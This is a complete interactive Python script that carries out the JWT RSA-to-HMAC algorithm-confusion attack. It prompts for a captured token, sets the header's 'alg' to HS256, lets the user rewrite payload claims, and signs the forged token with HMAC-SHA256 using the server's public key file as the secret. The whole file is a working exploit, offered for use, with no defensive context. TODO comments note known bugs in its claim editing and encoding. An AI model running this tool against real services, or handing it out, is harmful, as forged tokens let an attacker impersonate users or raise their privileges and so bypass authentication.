#! /usr/bin/env python3

# JWT vulnerability RSA -> HMAC exploit

import os
import sys
import re
import hmac
import base64
import hashlib

JWT_NUM_PARTS = 3
JWT_DELIMITER='.'

JSON_REWRITE = 'RE'
ENC_DEC_FORMAT_DEFAULT = 'utf8'

encDecFormat = ENC_DEC_FORMAT_DEFAULT
currentState = ''
currentStep = 1

# prints, prompts etc
# -------------------

def intro():
    printLine()
    print("""
Exploit the JWT RSA - HMAC vulnerability:

- carefully read the prompts
- input the requested data
- ???
- profit! get your exploited JWT generated
    """)
    iterateStep()

def clear():
    os.system('cls' if os.name == 'nt' else 'clear')

def printLine():
    print('*****************************************')

def iterateStep():
    global currentStep
    printLine()
    print('\nSTEP {}:\n'.format(currentStep))
    currentStep += 1

def refreshState(newLine, nextStepExists = True):
    global currentState
    currentState += newLine + '\n'
    clear()
    print('CURRENT STATE:\n')
    print(currentState)
    if nextStepExists:
        iterateStep()

def printJWTSection(sectionName, sectionContent):
    print('modify JWT section\n')
    print('section name: {}'.format(sectionName))
    print('section content: {}'.format(sectionContent))
    print('\n')

def promptWithNewLine(prompt):
    prompt = 'input {}'.format(prompt)
    prompt += ':\n'

    return input(prompt)

def promptWithDefault(promptText, defaultValue):
    prompt = promptText
    if '' != defaultValue:
        prompt += ' (press Enter for default "{}")'.format(defaultValue)

    return promptWithNewLine(prompt) or defaultValue

def printFinalJWT(finalJWT):
    refreshState('\n...FINISHED', nextStepExists = False)
    printLine()
    print('exploited JWT')
    printLine()
    print(finalJWT)
    print('\n\n')

# extract and modify JSON
# -----------------------

def processJson(dataType, defKey, defVal, encoded):
    jsonOriginal = deBase64(encoded)
    printJWTSection(dataType, jsonOriginal)
    jsonModified = getJsonModified(defKey, defVal, jsonOriginal)

    stateNewLine = 'modified {dataType}: {jsonModified}'.format(
        dataType = dataType,
        jsonModified = jsonModified
    )
    refreshState(stateNewLine)

    return jsonModified

def getJsonModified(defKey, defVal, jsonUnmodified):
    json = jsonUnmodified
    keyPrompt = """the name of the key, for which you want 
to change a value, without quotes;
[to rewrite entire JSON, input {}]"""
    key = promptWithDefault(keyPrompt.format(JSON_REWRITE), defKey)

    if JSON_REWRITE == key:
        json = promptWithNewLine('entirely new JSON')

    elif '' != key:
        valPrompt = 'value for key "{}"'.format(key)
        val = promptWithDefault(valPrompt, defVal)

        # TODO fix a bug: "someKey":12345 does not work,
        # because the current search regex does not work
        # with numeric values not wrapped into double quotes
        search = '{}":"[^"]*"'.format(key)
        replace = '{key}":"{val}"'.format(
            key = key, val = val
        )

        regExp = re.compile(search)
        json = regExp.sub(replace, json)

    return json

# Base64 endcode / decode
#------------------------

def deBase64(encodedStr):
    # avoid error by adding arbitrary amount of paddings;
    # extraneous padding will be ignored
    withPadding = encodedStr + '========'

    b64Bytes = withPadding.encode(encDecFormat)
    msgBytes = base64.b64decode(b64Bytes)

    return msgBytes.decode(encDecFormat)

def enBase64(rawStr):
    msgBytes = rawStr.encode(encDecFormat)
    b64Bytes = base64.b64encode(msgBytes)

    # JWT version of Base64 does not have paddings
    return b64Bytes.decode(encDecFormat).rstrip('=')

# get bytes
# ---------

def getKeyBytes():
    prompt='the path to the key file \n(current dir is {})'.format(os.getcwd())
    keyFilePath = promptWithNewLine(prompt)

    file = open(keyFilePath)
    key = file.read()

    refreshState('key loaded from file: {}'.format(keyFilePath))

    return bytes(key, encoding = encDecFormat)

# main
# ----

def getEncDecFormat():
    global encDecFormat
    formatPrompt = 'encoding / decoding format'
    encDecFormat = promptWithDefault(formatPrompt, ENC_DEC_FORMAT_DEFAULT)

    stateNewLine = '{formatPrompt}: {encDecFormat}'.format(
        formatPrompt = formatPrompt,
        encDecFormat = encDecFormat
    )
    refreshState(stateNewLine)

    return encDecFormat

def getJWTParts():
    jwtRaw = input('paste JWT and press Enter\n')
    parts = jwtRaw.split(JWT_DELIMITER)

    jwtLen = len(parts)
    if JWT_NUM_PARTS != jwtLen:
        print('JWT is invalid, expected {expected} elements, got {got}'.format(
            expected = JWT_NUM_PARTS, got = jwtLen
        ))
        sys.exit(1)

    refreshState('current JWT: accepted and parsed')

    return parts

def getSignature(keyBytes, tokenBytes):
    hmacDigest = hmac.new(keyBytes, tokenBytes, hashlib.sha256).digest()

    # TODO: try to use enBase64() and see if it works (after update to urlsafe_b64encode() there)
    return base64.urlsafe_b64encode(hmacDigest).decode(encDecFormat).rstrip('=')

def run():
    clear()
    intro()

    parts = getJWTParts()

    encDecFormat = getEncDecFormat()

    headerJson = processJson('header', 'alg', 'HS256', parts[0])
    payloadJson = processJson('payload', '', '', parts[1])

    tokenRaw = '{header}.{payload}'.format(
        header = enBase64(headerJson),
        payload = enBase64(payloadJson)
    )

    keyBytes = getKeyBytes()
    tokenBytes = tokenRaw.encode(encDecFormat)

    signature = getSignature(keyBytes, tokenBytes)

    finalJWT = '{tokenRaw}.{signature}'.format(
        tokenRaw = tokenRaw,
        signature = signature
    )

    printFinalJWT(finalJWT)

if __name__ == "__main__":
   run()
